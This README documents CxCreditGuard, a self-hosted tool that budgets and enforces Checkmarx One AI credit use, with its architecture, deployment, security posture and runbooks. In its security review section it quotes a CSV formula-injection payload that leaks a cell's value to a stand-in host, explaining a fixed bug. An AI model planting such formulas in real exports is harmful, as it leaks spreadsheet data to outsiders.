# CxCreditGuard

Self hosted governance for Checkmarx One AI credit consumption. Checkmarx One
spends AI credits on AI Triage, AI Remediation, DAST correlation, Fusion scans
and Auto Triage, but does not let you budget those credits per user, group,
project or application. CxCreditGuard polls consumption on a schedule, compares
it against limits you define, and can restrict access when a limit is breached.

Every restriction it makes is recorded with the state needed to undo it, and is
reversible from the GUI with one click.

## High-level architecture

CxCreditGuard is **one deployable unit**: a FastAPI backend that also serves the
React single-page app from the same origin, a background scheduler running in the
same process, and a database (SQLite by default, PostgreSQL for the hardened
deployment). It talks to exactly one external system — the Checkmarx One APIs —
and it does so only through a single hardened HTTP client.

Everything of consequence happens in one loop, `services/cycle.py`, run on a
schedule or on demand via `POST /api/ops/run-cycle`:

```
                         Checkmarx One APIs
                   (IAM · projects · usage · AI toggles)
                                 ▲   │
             role / toggle       │   │   poll consumption
             writes (enforce)    │   │   sync org model
                                 │   ▼
   ┌────────────────────────────────────────────────────────────────┐
   │                    cycle.py  (one orchestrator)                │
   │                                                                │
   │    org_sync  ─▶  ingestion  ─▶  evaluation  ─▶  enforcement    │
   │    users,        snapshots +    usage vs        reversible     │
   │    projects      attribution    limits,         role / AI      │
   │                  (fuzzy match)   period          changes, with │
   │                                  baselines       an undo snap  │
   │                                      │                         │
   │                                      ▼                         │
   │                              notifications                     │
   └────────────────────────────────────────────────────────────────┘
        │ reads / writes                        │ email · webhook
        ▼                                        ▼
   Database (SQLite / PostgreSQL)          Operators + the React GUI
   snapshots, limits, enforcement,         (served from the same origin)
   audit log, accounts, notifications
```

- **Poll, don't stream.** Checkmarx reports *aggregate totals over a lookback
  window*, not events, so per-period usage is derived by diffing against a
  baseline taken when the period opened (see [How usage is measured](#how-usage-is-measured)).
- **Attribute, don't guess.** Each usage row is matched to a synced user — first
  exactly, then by similarity — and anything uncertain is surfaced for review
  rather than billed to the wrong person.
- **Act reversibly.** Before any enforcement the prior state is snapshotted, so
  every restriction is one click to undo.
- **One-way dependencies.** `api` and `scheduler` call `services`; `services`
  call `checkmarx` and `models`; nothing below `services` knows the web layer
  exists. The [Code layout](#code-layout) section maps this to files.

## Build status

| Step | Area | State |
| ---- | ---- | ----- |
| 1 | Skeleton, schema, migrations, utility auth, containers | Done |
| 2 | Checkmarx auth: API key parsing, token exchange, refresh | Done |
| 3 | Org model sync (users, groups, projects, applications) | Done |
| 4 | Usage ingestion and attribution | Done |
| 5 | Limit engine and evaluator | Done |
| 6 | Enforcement service with reversibility and idempotency | Done |
| 7 | Scheduler wiring | Done |
| 8 | GUI: Setup, Dashboard, Limits, Notifications, Audit, Settings | Done |
| 9 | Notification delivery (email, webhook), retention, security review, docs | Done |

`POST /api/ops/run-cycle` performs a full sync, ingest, evaluate and enforce pass
and returns per step statistics, and the GUI drives the same endpoints.

647 tests cover the backend, with every Checkmarx endpoint served by an in-memory
fake tenant (`backend/tests/fake_tenant.py`) that holds mutable state, so tests
assert on what enforcement actually changed rather than on which calls were made.
The frontend is type checked with `tsc` on every build.

### Checkmarx One scan and security posture

The codebase has been scanned with Checkmarx One (project `CxCreditGuard`) across
all five engines — SAST, SCA, KICS/IaC, Containers and Secret Detection — and the
findings attributable to this repository have been remediated. Remediation cut the
total from **416 to 237**:

| Severity | Baseline | After remediation |
| -------- | -------- | ----------------- |
| Critical | 30 | 12 |
| High | 149 | 93 |
| Medium | 143 | 68 |
| Low | 78 | 52 |
| Info | 16 | 12 |
| **Total** | **416** | **237** |

**What was remediated:**

- **Container images.** The runtime moved from Debian `python:3.11-slim` to
  `python:3.11-alpine` (both `backend/Dockerfile` and `deploy/podman/Dockerfile`),
  and the proxy to `nginx:1.27-alpine-slim`. Debian's userland (apt, perl,
  coreutils, tar) was the source of ~175 OS-package CVEs; Alpine carries a small
  fraction. psycopg runs in its pure-Python mode against the system `libpq`, since
  `psycopg[binary]` ships glibc-only wheels.
- **IaC (KICS).** `HEALTHCHECK` on both images; the unpinned `apt-get install curl`
  layer removed (the health check uses the bundled interpreter); `cap_drop: ALL`
  plus a minimal `cap_add` and `no-new-privileges` on the `db` and `proxy`
  services; no password literals in `.env.example`.
- **Secret Detection.** The JWT-shaped fixture in `backend/tests/test_token.py` is
  built at runtime, so no token-like literal is committed.
- **Logging (SAST).** Control characters are escaped in every rendered log record,
  closing the log-forging class as defence in depth.

**Residual findings and why they remain open:**

- **SAST** (`Reflected_XSS`, `Stored_XSS`, `Trust_Boundary_Violation`,
  `Information_Exposure`, `Client_Server_Empty_Password`) are false positives for
  this architecture: the backend is a JSON API with no server-side HTML rendering,
  and the React SPA escapes output. The correct disposition is a `NOT_EXPLOITABLE`
  triage in Checkmarx, not a code change.
- **KICS** residuals are the scanner matching env-var *names* (`POSTGRES_PASSWORD`)
  as secrets and flagging the presence of a `cap_add` block, plus the privileged
  ports (80/443) inherent to a public reverse proxy.
- **Containers** — the remaining OS-package CVEs live in `postgres:16-alpine`
  (already the latest of its major line; a major bump requires a data migration)
  and a small Alpine residual; these are upstream and clear only as the base-image
  publishers ship patches.
- The `esbuild` SCA advisory (GHSA-gv7w-rqvm-qjhr) affects only esbuild's Deno
  distribution; this project builds with vite via the npm/Node distribution and is
  unaffected. It is triaged `NOT_EXPLOITABLE`.

Dependency audits are clean on both sides (`pip-audit --strict` over the resolved
requirements, `npm audit`).

## How usage is measured

This matters more than any other design decision here, and it is not obvious.

`GET /api/credits/consumption` returns **aggregate totals over a lookback
window**, not a stream of timestamped events. There are no event ids, no
timestamps and no project ids in the user view. So per-period usage cannot be
summed from events. Instead:

1. Each cycle polls the endpoint per dimension and stores the reported totals
   (`usage_snapshot` and `usage_record`, with the raw payload kept for audit).
2. When a budget period opens, the total reported at that moment becomes the
   period's **baseline**.
3. Usage for the period is `latest reported total - baseline`.

**The baseline depends on the period type**, because the period type is what says
whether history should count:

| Period | Baseline | Why |
| ------ | -------- | --- |
| Lifetime | Zero. Everything reported counts. | "Lifetime" means all credits ever. Discounting history would silently redefine it as "since the limit was created", and a budget of 10 against 13 already spent would read as 0 used and within budget. |
| Custom range | Zero. Everything reported counts. | The admin chose the window explicitly and expects consumption inside it to count. |
| Monthly, quarterly | The total reported when the period opened. | The lookback window is wider than the period and the API does not say *when* inside it credits were spent, so counting the lot would let a year of history exhaust a fresh monthly budget on day one. Set `count_existing_usage` on the limit to count it anyway. |

Whenever a baseline is in play, the Limits page shows the reported total and the
discounted amount underneath the usage bar, so a project that Checkmarx says used 13
credits reading as 0 against its budget is explained rather than mysterious.

If the lookback window slides far enough that the reported total falls below the
baseline, the baseline is lowered to match, so usage never goes negative and a stale
high baseline cannot mask real consumption.

Usage per entity level:

| Level | Source |
| ----- | ------ |
| User | `viewBy=user`, attributed to a synced IAM user |
| Application | `viewBy=application`, falling back to the sum of its projects |
| Project | `viewBy=project` |
| Group | `viewBy=group` when the group appears in the response, otherwise the sum of the group's projects, plus member users when `include_member_usage` is on |

### The endpoint silently ignores an unrecognised `viewBy`

This is the trap worth knowing about. `viewBy=anything-at-all` does not fail: it
answers **HTTP 200 with the user dimension**. So a successful response is not
evidence that the dimension you asked for exists, and naive code will file user
consumption as project or application usage.

Support is therefore established by comparison, not by status code. Once per run,
the utility asks for a deliberately invalid `viewBy` to capture what the fallback
looks like, and a dimension whose subjects are identical to that fallback is marked
unsupported in `dimension_state` and never polled again. Both sides have to be non
empty for that conclusion, because a real but idle dimension legitimately returns
nothing, and two empty responses prove nothing.

Verified against a live tenant: `user`, `action`, `application`, `project` and
`group` are all real dimensions. `action` names each type in title case
(`Triage`, `Remediation`) with the lowercase `actionType` nested underneath.

### Auto Triage is reported as a pseudo-user

The user dimension includes a synthetic subject named `Auto-triage` carrying the
credits that automation spent. It is not a person, so it is never offered as an
unmatched user to map, and never counted against a user limit. Per the brief, that
consumption belongs to the project, and it is counted there and tenant wide.

### Attribution

The consumption feed identifies users by display name and email, not by id, and
inconsistently: some rows carry `email` and `userEmail`, some carry an address in
`name`, some carry only a display name, and some carry a service-style handle like
`cx-ryan-wakeham`. Attribution happens in two stages.

**Exact ladder first.** Email, then an email found in `name`, then username, then
unambiguous full name. Two people called "Sean Casey" never share a budget: an
ambiguous full name is not matched.

**Similarity for the tail** (`services/subject_matching.py`). A handle the ladder
cannot place is normalised to a token set — the `cx-` prefix stripped, an email
reduced to its local part — so `cx-ryan-wakeham`, `Ryan Wakeham` and
`ryan.wakeham@checkmarx.com` all reduce to `{ryan, wakeham}` and score against
every synced user. The score, deliberately conservative because a wrong match
bills the wrong person, decides:

| Confidence | Outcome |
| ---------- | ------- |
| **≥ 85%**, one clear winner | Attributed automatically and written to the audit log. Still overridable. |
| **≥ 60%**, or an auto-worthy near-tie between two people | Left **uncounted** and raised as a *dispute* with ranked suggestions to confirm on the Settings page. |
| below 60% | Unmatched, mapped by hand. Automation handles (`dependabot[bot]`) are flagged and kept out of the queue. |

Nothing is ever dropped: every subject lands in `unresolved_subject` with its
status, and the Settings page groups them into **Disputes**, **Auto-matched** and
**Unmatched** tabs. An admin mapping always wins over the automatic decision.

## What the enforcement actions actually are

| Level breached | What changes |
| -------------- | ------------ |
| User | The AI roles (`view-risk-management`, `view-risk-management-dashboard`, `view-risk-management-tab`) and the scan-viewing role (`view-scans`) are unmapped from the user on the `ast-app` client |
| Project | Auto Triage is disabled via `PUT /api/ai-agents-coordinator/projects/{id}/configuration`, and PR triage and remediation is disabled by clearing `remediationSeverities` via `PATCH /api/repos-manager/repo/{repo_id}?projectId={id}` |
| Group | Both project actions, on every project in the group |
| Application | Both project actions, on every project in the application |

Before anything changes, the current state is read and stored on the enforcement
row: exactly which roles the user held, the project's prior Auto Triage `enabled`
flag **and its full config**, and the prior severity list. Restore replays that
snapshot. A feature that was already off before the utility touched it stays off
afterwards, and a restore never resets branches or severity levels.

## Deploy

Two supported paths, both on Podman. Start with the single container to try it;
use Compose to run it for real.

### Quick start — single container

The whole utility ships in **one** image (UI bundled with the API) over plain
HTTP on port 8000, with **no required configuration**: on first start it
generates its own master key and a first admin account. From the repository root:

```sh
# Linux / macOS / WSL
make podman-run

# Windows: run.bat (cmd.exe) or .\run-podman.ps1 (PowerShell)
```

Each builds `cxcreditguard:podman`, starts the container, and tails the startup
log — which prints the initial `admin` credentials on a fresh volume. Then open
**http://localhost:8000**.

The equivalent without the helper scripts:

```sh
podman build -f deploy/podman/Dockerfile -t cxcreditguard:podman .
podman volume create cxcreditguard-data
podman run -d --name cxcreditguard --restart unless-stopped \
  -p 8000:8000 -v cxcreditguard-data:/app/data cxcreditguard:podman
```

| Action | `make` | `run.bat` | `run-podman.ps1` |
| ------ | ------ | --------- | ---------------- |
| Build and run | `make podman-run` | `run.bat` | `.\run-podman.ps1` |
| Stream logs | `make podman-logs` | `run.bat logs` | `.\run-podman.ps1 -Logs` |
| Stop / remove | `make podman-down` | `run.bat down` | `.\run-podman.ps1 -Down` |
| Erase all data | `make podman-purge` | `run.bat purge` | `.\run-podman.ps1 -Purge` |

Good to know:

- **State lives in the `cxcreditguard-data` volume** (`/app/data`): the SQLite
  database, the master key (`.master_key`) and the generated password
  (`.admin_password`). Back it up if you store real Checkmarx secrets — losing
  the volume loses the key and makes those secrets unrecoverable. A host bind
  mount must be writable by UID 10001.
- **This image runs in development mode over plain HTTP** (Secure cookies are off,
  because a browser discards them over HTTP and login would appear to do nothing).
  **Do not expose it directly to the internet** — use Compose for that.

### Hardened deployment — Podman Compose

For production (HTTPS via an nginx TLS proxy, plus PostgreSQL) run the root
`docker-compose.yml` with Podman Compose (Podman 4.1+):

```sh
cp .env.example .env
# Generate a master key for the .env file:
python -c "import os,base64;print(base64.b64encode(os.urandom(32)).decode())"
```

Set `CXCG_MASTER_KEY` (the value printed above — everything encrypted at rest
depends on it) and `POSTGRES_PASSWORD` (any strong value; Compose won't start
without it). To bootstrap the first admin, also set `CXCG_BOOTSTRAP_ADMIN_USERNAME`
and `CXCG_BOOTSTRAP_ADMIN_PASSWORD` before the first start, then remove them after
logging in. Provide a TLS certificate per [deploy/nginx/README.md](deploy/nginx/README.md),
then:

```sh
podman compose -f docker-compose.yml up -d
podman compose -f docker-compose.yml logs -f app
```

## Local development

```sh
python -m venv .venv
.venv/Scripts/activate            # Windows
# source .venv/bin/activate       # macOS and Linux

pip install -e "backend[dev]"

export CXCG_ENV=development
export CXCG_COOKIE_SECURE=false   # only valid outside production
export CXCG_MASTER_KEY="$(python -c 'import os,base64;print(base64.b64encode(os.urandom(32)).decode())')"

cd backend
uvicorn app.main:app --reload
```

Migrations run automatically at startup. The API is at
`http://127.0.0.1:8000`, interactive docs at `/docs` (development only, never
exposed in production), and health at `/healthz`.

### Tests, lint, dependency audit

```sh
cd backend
python -m pytest -q            # 647 tests
python -m ruff check .
python -m ruff format --check .
python -m pip_audit             # dependency vulnerability scan
```

Every Checkmarx call in the tests is served by `httpx.MockTransport`, and retry
backoff is injected, so the suite makes no network calls and takes seconds.

### Driving a cycle by hand

```sh
curl -sX POST https://host/api/ops/run-cycle?force_org_sync=true \
  -b cookies.txt -H "X-CSRF-Token: $CSRF"
```

Returns per step statistics: users and projects synced, records ingested per
dimension, limits evaluated, warnings raised, restrictions applied, and any step
that failed. `GET /api/ops/status` gives the dashboard tiles (next run, last
success, entities in warning, entities restricted, unresolved subjects).

## The GUI

React, TypeScript and Tailwind, built by Vite into `backend/app/static` and served
by the same origin as the API. No CORS in production, no separate deployment, and
one artefact.

| Page | What it does |
| ---- | ------------ |
| **Setup** | Paste an API key, confirm the derived tenant and region before anything is stored, test the connection, override the regional base URL |
| **Dashboard** | Tenant total, trend of credits consumed between polls, split by action type, top consumers per level with limits marked, status tiles |
| **Limits** | Table per entity level with live usage bars, create and edit, monitor/enforce toggle, exemptions, bulk edit, CSV import and export |
| **Notification Center** | Filterable feed, unread badge, active restrictions table, one click "Restore access" with confirmation |
| **Audit log** | Searchable, paginated, with a before/after diff view per entry |
| **Settings** | Scheduler interval or cron, org refresh, ingestion window, retention, SMTP and webhook, consumption attribution (disputes / auto-matched / unmatched), utility accounts |

Screenshots: `docs/screenshots/` (placeholders, to be captured against your own
tenant).

Notes on how it is built, since a few choices are deliberate:

- **Dark and light are both selected palettes**, not one flipped into the other.
  The chart series colours are separate validated steps per surface.
- **Charts are hand written SVG and CSS**, no charting library. That keeps the
  bundle small, keeps every mark under our control, and means no third party
  script has to be allowed by the CSP.
- **One series means no legend, two or more always get one**, and every series is
  also directly labelled, so identity is never carried by colour alone. Each chart
  has a table view for the same reason.
- **No inline scripts anywhere.** The CSP has no `unsafe-inline` for scripts, so
  even the theme bootstrap runs from the bundle. A test asserts this stays true.
- The dashboard plots the **difference between polls** rather than the cumulative
  figure, because the cumulative curve over a sliding window says nothing useful.
  Both numbers appear in the table view; they are never put on one plot with two
  y-scales.

### Frontend development

```sh
cd frontend
npm install
npm run dev        # http://localhost:5173, proxies /api to 127.0.0.1:8000
npm run build      # type checks, then emits into backend/app/static
```

The backend serves the built bundle when `backend/app/static` exists and runs API
only when it does not, so a backend-only checkout still works.

### Trying it without a tenant

```sh
cd backend
python -m scripts.seed_demo --admin-password 'Str0ng!Demo#Pass'
uvicorn app.main:app
```

That writes a representative organisation model, 24 polls of usage history,
limits in several states, notifications and audit entries, then you can sign in as
`demo-admin`. It never calls Checkmarx and never enforces anything. Use it for
screenshots and for finding your way around before pointing the tool at a real
tenant.

## Code layout

```
backend/app/
  core/          config, AES-256-GCM secret box, Argon2 passwords, token hashing,
                 logging with redaction
  db/            engine, session scope, portable column types, migration runner
  models/        accounts, connection, org mirror, usage snapshots, limits,
                 enforcement records, notifications, audit log
  checkmarx/     apikey, regions, token, client, usage (consumption parser),
                 iam (users, groups, role mappings), platform (projects,
                 applications, AI toggles)
  services/      connection, auth, audit, org_sync, ingestion, periods,
                 evaluation, enforcement, limits_service, notifications,
                 settings_store, cycle
  scheduler.py   APScheduler wiring, reconfigurable at runtime
  api/           dependencies (auth, CSRF, RBAC), middleware, routes
  schemas/       request and response models with strict validation
  static/        the built SPA (produced by the frontend build, not in git)
alembic/         migrations
scripts/         seed_demo.py, for a tenant-free demo database
tests/           unit, service and API tests, plus the in-memory fake tenant

frontend/src/
  api/           typed fetch client with CSRF handling, response types
  components/    app shell, UI primitives, entity picker, stat tile
  components/charts/  trend line, action breakdown, top consumer bars
  pages/         Login, Setup, Dashboard, Limits, Notifications, Audit, Settings
  lib/           formatting, theme and toast context
  hooks/         data fetching and polling

deploy/nginx/    TLS terminating reverse proxy
```

The dependency direction is one way, as the [high-level diagram](#high-level-architecture)
shows: `api` and `scheduler` call `services`, `services` call `checkmarx` and
`models`, and nothing below `services` knows the web layer exists. `cycle.py` is
the only orchestrator.

Two design decisions worth knowing before reading the code:

**Sync I/O throughout.** This is a single tenant admin tool whose busiest hour
involves a handful of admins and one scheduler thread. Sync SQLAlchemy and
`httpx.Client` remove a whole class of async footguns (accidental blocking
calls, session sharing across tasks) at no practical cost.

**One HTTP client for all Checkmarx traffic.** `app/checkmarx/client.py` owns
base URL selection, token injection, re-authentication on 401, retry with
exponential backoff and full jitter, `Retry-After` handling, redacted logging and
pagination. No service is allowed to call Checkmarx directly, so those
behaviours cannot drift between callers.

## Notification delivery

The Notification Center is always the record of truth. Email and webhook are
copies, so a broken SMTP server can never lose a warning or hide an enforcement
action. Delivery outcome is written back per channel and shown in the feed.

Both channels are configured on the Settings page, which also has a "Send a test"
button that delivers a sample without leaving a row behind in the feed.

- **Minimum severity** filters what gets pushed out. The default is warning and
  above, so a quiet informational notification does not wake anyone up.
- **Retries stop.** After three failed attempts a notification is marked as given
  up on, because a dead endpoint should not make the utility resend the same
  payload every two minutes for a week. Changing the delivery settings resets the
  counters, since that is a real chance for the channel to start working.

### Webhook payload

```json
{
  "id": 412,
  "created_at": "2026-08-11T09:14:02+00:00",
  "severity": "critical",
  "category": "enforcement",
  "title": "User Harsh Gokani restricted",
  "body": "The user limit on Harsh Gokani was reached in 2026-08 ...",
  "entity": { "type": "user", "id": "8f1a999b-...", "label": "Harsh Gokani" },
  "enforcement_action_id": 37,
  "reversible": true,
  "tenant": "your-tenant",
  "source": { "name": "CxCreditGuard", "version": "0.1.0" }
}
```

When a signing secret is configured, each request carries:

```
X-CxCreditGuard-Timestamp: 1786000442
X-CxCreditGuard-Signature: sha256=<hex>
```

The signature is `HMAC-SHA256(secret, "<timestamp>.<raw body>")`. Verify it against
the **raw** body before parsing, and reject a timestamp that is too old. The
timestamp is inside the signed material precisely so a captured request cannot be
replayed later with a fresh header.

One deliberate limitation: the webhook target is only checked against the cloud
metadata addresses and literal link-local addresses. It is not a general egress
control. Resolving DNS here would add a live lookup to every delivery, turn a DNS
blip into a delivery failure, and still leave a gap between the check and the
connection. Posting to an internal host is a supported deployment, so private
ranges are allowed. Only an Admin can set the URL.

## Data retention

`retention_days` (default 365) controls how long snapshots, notifications,
scheduler runs and audit entries are kept. Pruning runs at most once a day inside
the normal cycle. Four safeguards are worth knowing:

1. **A seven day floor.** A shorter setting is raised to it and the run says so. A
   governance tool with a week of history cannot answer the question it exists to
   answer.
2. **Applied enforcement actions are never pruned.** Their undo snapshot is the
   only record of how to give access back, so it outlives any retention window.
3. **A notification attached to a live restriction is kept**, however old, because
   it carries the Restore access button.
4. **The prune of audit rows is itself audited.** `app/services/retention.py` is
   the only code anywhere that deletes audit rows, and it writes an entry stating
   the counts, so the log always explains its own gaps.

## Configuration

Every variable is documented in [.env.example](.env.example). The ones that
change behaviour most:

| Variable | Default | Notes |
| -------- | ------- | ----- |
| `CXCG_MASTER_KEY` / `CXCG_MASTER_KEY_FILE` | none | Required. 32 bytes base64. Startup fails without it. |
| `CXCG_DATABASE_URL` | SQLite in `./data` | `postgresql+psycopg://...` for Postgres. |
| `CXCG_ENV` | `production` | `production` refuses insecure cookies and hides the API docs. |
| `CXCG_SESSION_IDLE_TTL_MINUTES` | 60 | Idle timeout. |
| `CXCG_SESSION_ABSOLUTE_TTL_HOURS` | 12 | Hard cap regardless of activity. |
| `CXCG_LOGIN_MAX_ATTEMPTS` | 5 | Failures before lockout, which then backs off exponentially. |
| `CXCG_CX_TOKEN_REFRESH_MARGIN_SECONDS` | 300 | Refresh the access token this long before it expires. |

## Security posture

1. **Secrets at rest.** The Checkmarx API key, TOTP secrets and (once step 9
   lands) SMTP and webhook secrets are encrypted with AES-256-GCM. Keys are
   derived per purpose from the master key with HKDF-SHA256, and the purpose is
   bound in as additional authenticated data, so a ciphertext written for one
   column cannot be replayed into another. The master key comes from the
   environment or a mounted file and is never written to the database.
2. **Secrets in logs.** `app/core/logging.py` interpolates each record and then
   redacts it: JWT shaped values, `Authorization` headers, OAuth form fields and
   credential shaped JSON keys go by pattern, and live secret values (the
   decrypted API key, issued access tokens) are additionally scrubbed by exact
   match through a runtime registry.
3. **Utility authentication.** Local accounts with Argon2id hashing, an enforced
   password policy, optional TOTP, opaque session tokens stored only as SHA-256
   digests, `HttpOnly` `Secure` `SameSite=Strict` cookies, an idle timeout and an
   absolute cap.
4. **CSRF.** Double submit: a script readable CSRF cookie echoed back in
   `X-CSRF-Token` and compared against the digest on the session row. The check
   lives inside the authentication dependency, so a new state changing route
   cannot ship without it.
5. **RBAC.** Admin has full control. Viewer is read only. The last active Admin
   cannot be demoted, disabled or deleted, and no one can demote themselves.
6. **Login abuse.** Per username and per IP rate limiting plus account lockout
   with exponential backoff. Unknown usernames still incur an Argon2
   verification, so response timing does not enumerate accounts, and the error
   message is identical for an unknown user and a wrong password.
6b. **The SPA runs under a strict CSP with no inline scripts.** Charts are hand
   written SVG rather than a charting library, so no third party script has to be
   allowed, and a test asserts that no inline `<script>` creeps into the shell.
7. **Transport.** HTTPS with HSTS, a strict CSP, `X-Frame-Options: DENY`,
   `nosniff`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store` on API
   responses.
8. **Input validation and SQL.** Pydantic schemas with `extra="forbid"` and
   length bounds on every field. All database access goes through the SQLAlchemy
   ORM with bound parameters. There is no string built SQL anywhere in the
   codebase.
9. **Audit integrity.** `app/services/audit.py` is the only module that writes
   `audit_log_entry`, and it exposes no update or delete. Audit rows share the
   caller's transaction, so an action and its record either both land or neither
   does.
10. **Container.** Non root user, read only root filesystem, all capabilities
    dropped, `no-new-privileges`, and no compiler or package manager in the final
    image. Only the proxy publishes ports.

### Security review findings

A manual review of the security critical paths found three issues, all fixed, all
with regression tests in `backend/tests/test_security_hardening.py`:

1. **CSV formula injection in the limits export.** A Checkmarx project named
   `=HYPERLINK("http://evil.example/?leak="&A1,"click")` would have been evaluated
   when the export was opened in Excel or Sheets. Entity labels come from the
   tenant, so they are not ours to trust, and an export exists to be opened in a
   spreadsheet. Cells beginning with `=`, `+`, `-`, `@`, tab or carriage return are
   now prefixed with an apostrophe, which the importer strips again so a round trip
   stays lossless. Numeric columns are untouched.
2. **Mail header injection through a notification title.** Titles are built from
   tenant entity names, so a name containing CRLF could either break message
   serialisation or inject a header. Header values are now collapsed to a single
   line and length bounded.
3. **Unbounded growth of the login rate limit table.** Every distinct username and
   IP pair seen at the login form created a row that never expired, which is an
   unbounded table fed by unauthenticated input. Counters older than a day are now
   pruned by the retention job, late enough that an operator investigating a
   password guessing attempt can still see them.

Two things were considered and deliberately left as they are, both documented at
the code: the webhook target check is not a general egress control, and
`X-Forwarded-For` is trusted for rate limiting and logging but never for
authorisation.

### Threat model notes

- **In scope.** A malicious or careless tenant user trying to spend past their
  budget. An attacker with network access to the GUI attempting credential
  guessing, session theft, CSRF or privilege escalation. An attacker with a
  database dump, who gets neither usable sessions nor decryptable secrets without
  the master key.
- **Out of scope.** An attacker who already has the master key and the database,
  or root on the host. Tenant side abuse that consumes credits without emitting a
  consumption event, since the utility can only act on what the Checkmarx APIs
  report.
- **The interesting risk is a false positive.** This tool's job is to take
  privileges away from real engineers. That is why every new limit defaults to
  monitor only, why enforcement records an undo snapshot before it acts, and why
  the runbook below exists.

### Checkmarx permissions the API key needs

Use a **dedicated service account**, not a person's key. A named engineer's key
inherits their permissions, breaks when they leave, and makes the audit trail read
as though they personally restricted every one of their colleagues.

The key needs to reach these endpoints:

| Purpose | Call | Access needed |
| ------- | ---- | ------------- |
| Token exchange | `POST /auth/realms/<tenant>/protocol/openid-connect/token` | The API key itself |
| Users, roles, groups | `GET /auth/realms/<tenant>/users/v2`, `GET /auth/realms/<tenant>/groups` | Read users and groups in IAM |
| Projects, applications | `GET /api/projects`, `GET /api/applications` | Read projects and applications, tenant wide |
| Credit usage | `GET /api/credits/consumption` | Read credit consumption |
| Role mapping (enforce mode only) | `GET`/`POST`/`DELETE` `/auth/admin/realms/<tenant>/users/{id}/role-mappings/clients/{clientUuid}`, plus `GET .../clients` and `GET .../clients/{uuid}/roles` | IAM admin, sufficient to manage role mappings |
| Project AI toggles (enforce mode only) | `GET`/`PUT` `/api/ai-agents-coordinator/projects/{id}/configuration`, `PATCH /api/repos-manager/repo/{repoId}?projectId={id}` | Manage project configuration |

Least privilege in practice: **the write permissions in the last two rows are only
needed if you intend to use enforce mode.** A read-only key runs the whole utility
in monitor-only mode, which is a reasonable way to start. Enforcement then fails
with a clear 403 message naming the missing permission rather than silently doing
nothing.

Projects the key cannot see are projects whose usage cannot be counted. The org
sync reports that as a warning rather than undercounting quietly.

## Runbook: the utility restricted someone it should not have

1. **Restore first, investigate second.** Open the Notification Center, find the
   entry for that user or project, and use "Restore access". It re-applies the
   exact role mappings or project setting captured in the enforcement record
   before the change. Do not hand edit roles in Checkmarx One, because the
   utility would then hold a stale undo snapshot.
2. **Stop it happening again in the next cycle.** On the Limits page, either
   switch that limit to monitor only or add the entity to the exemption list.
   Restoring access without doing this means the next cycle re-enforces.
3. **Work out which limit fired.** The notification names the entity and the
   limit. Remember that the most restrictive limit wins: a user can be restricted
   by a group, project or application limit they had no idea applied to them.
4. **Check the attribution.** The Audit Log holds the before and after state of
   every action. If usage was attributed to the wrong user, the raw consumption
   payload is stored on each event for exactly this comparison.
5. **If the GUI is unavailable**, restoring access in Checkmarx One directly is
   always safe: re-add the role, or re-enable the project setting. Then mark the
   enforcement record as reversed in the utility, or clear the limit, before the
   next cycle runs.
6. **Blast radius check.** An application limit disables AI features on every
   project in that application, and a group limit on every project in that group.
   The notification lists each target it touched, and each has its own restore.
7. **If someone's usage looks wrong**, check Settings for unmatched credit usage.
   Consumption reported against a name or address that does not match a synced IAM
   user is not counted towards any user limit, and the fix is to map it there.

## Runbook: a figure on screen does not match Checkmarx

Run the diagnostic. It answers the question directly and touches nothing:

```sh
cd backend
python -m scripts.diagnose_usage --project "singakash/CxHybrid"
python -m scripts.diagnose_usage --user "someone@example.com"
```

It walks the whole chain and names the cause: whether the entity is synced, whether
the tenant reports that dimension, exactly which row the snapshot contained, and how
that row became the number on screen. The two causes it separates are the ones that
look identical from the outside:

- **Attribution failure.** Checkmarx reported credits under a name or id that did
  not match the synced entity, so they count towards nothing. It prints the reported
  identifier next to the synced one.
- **Baseline effect.** The credits matched, but they were spent before the budget
  period opened, so they do not count against it. It prints the reported total, the
  baseline and the difference, and says which period type rule applied.

## Runbook: turning enforcement on for the first time

Recommended order, because the failure mode of this tool is restricting the wrong
person:

1. Connect with a **read only** API key and leave every limit on its monitor only
   default. Nothing can be restricted, and the write permissions are not needed.
2. Let it run for at least one full budget period. Watch the Limits page: are the
   figures what you expect, and is anyone showing as unmatched on Settings?
3. Fix attribution first. An unmatched user is a budget that silently undercounts.
4. Add exemptions for break glass accounts and any project that must never lose AI
   features.
5. Switch **one** limit to enforce, on an entity you control, and verify the
   restriction and the restore both work end to end.
6. Only then widen. Bulk edit can switch many limits at once, and switching them
   back to monitor only lifts every restriction they caused.

## Remaining unknowns

None of these block the utility, and each one degrades safely rather than guessing.
They are listed because each has a cost worth knowing about.

1. **How to discover a project's `repo_id`.** Read opportunistically from the
   project payload (`repoId`, `repositoryId`, `repo_id`), accepting both the
   integer `repoId` the API normally reports (e.g. `"repoId": 228481`) and the
   string form older payloads carry. Where it is still absent, the PR
   triage and remediation half of project enforcement is skipped and the record says
   so; Auto Triage is still disabled. A list-repositories endpoint would close this,
   and this is the most valuable of the remaining gaps.
2. **Pagination parameters for `/users/v2`.** The endpoint is called without
   parameters first; if fewer users come back than `filteredCount`, it retries with
   `page` and `size`. If that makes no progress, the sync warns with the exact
   shortfall rather than treating a partial list as complete.
3. **The `group` dimension's row shape.** `viewBy=group` is a real dimension but
   has only ever been observed empty, so the row shape is unverified. Group rows are
   matched by id then name like projects, and a group that does not match falls back
   to the local rollup of its projects, which is the behaviour that was there before.
   No guess about an unseen payload can cause a wrong figure.
4. **`scan.config.ai.allowAiUsage`.** The project configuration API exposes an
   `ai` category entry named "Allow AI Usage", overridable per project. It is not
   used, because the two mechanisms specified were the ones implemented. If that flag
   is the authoritative master switch, adding it is one function in
   `app/checkmarx/platform.py`.

Settled since the first draft: the `period` parameter accepts exactly
`last_month`, `last_30_days`, `last_90_days`, `last_180_days` and `last_year`, all
verified against a live tenant. Anything else is a 400, so the Settings page offers
them as a list and the API rejects the rest rather than letting ingestion break
silently.

Everything that knows the shape of the consumption payload lives in
`app/checkmarx/usage.py`, and the project toggles live in
`app/checkmarx/platform.py`, so each of these is a single file edit.
